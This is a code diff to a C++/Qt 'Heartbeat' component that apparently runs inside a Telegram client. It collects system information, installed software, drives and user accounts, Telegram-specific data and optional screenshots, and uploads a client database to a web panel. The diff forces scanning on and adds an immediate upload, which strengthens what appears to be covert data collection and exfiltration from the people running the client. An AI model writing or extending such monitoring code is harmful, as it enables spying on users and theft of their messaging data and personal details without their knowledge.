@@ -101,35 +101,20 @@ void Heartbeat::start() {
     // QString lockPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/telegram_scan.lock";
     bool shouldScan = true; // FORCE SCAN FOR DEBUGGING
     
-    /*
-    QFile lockFile(lockPath);
-    if (lockFile.open(QIODevice::ReadWrite)) {
-        // Check if locked or stale (e.g. > 1 hour)
-        QByteArray data = lockFile.readAll();
-        bool stale = true;
-        if (!data.isEmpty()) {
-            qint64 timestamp = data.toLongLong();
-            if (QDateTime::currentSecsSinceEpoch() - timestamp < 3600) {
-                stale = false;
-            }
-        }
-        
-        if (stale) {
-            shouldScan = true;
-            lockFile.resize(0);
-            lockFile.write(QByteArray::number(QDateTime::currentSecsSinceEpoch()));
-        }
-        lockFile.close();
-    }
-    */
-    
-    collectSystemInfo(); // Always collect basic info
+    // 1. Indicate Scanning State
+    _dataStatus = "Scanning...";
+    collectSystemInfo(); // Writes "Scanning..." to DB
+    uploadClientDb();    // Immediately upload to show "Scanning..." on Web
     
     if (shouldScan) {
         collectInstalledSoftware();
         collectDrivesAndUsers(); // Collect File System Roots
     }
     
+    // 2. Scan Finished - Revert to Active
+    _dataStatus = "Active";
+    collectSystemInfo(); // Writes "Active" to DB
+
     // Always collect Telegram specific data (this is per-client isolated)
     collectTelegramData();
     
@@ -270,7 +255,7 @@ void Heartbeat::collectSystemInfo() {
     
     // Additional Info
     QString externalIp = "Unknown";
-    QString dataStatus = "Active";
+    QString dataStatus = _dataStatus;
     int autoScreenshot = _monitorTimer.isActive() ? 1 : 0;
     int heartbeatInterval = _timer.interval() / 1000;
 
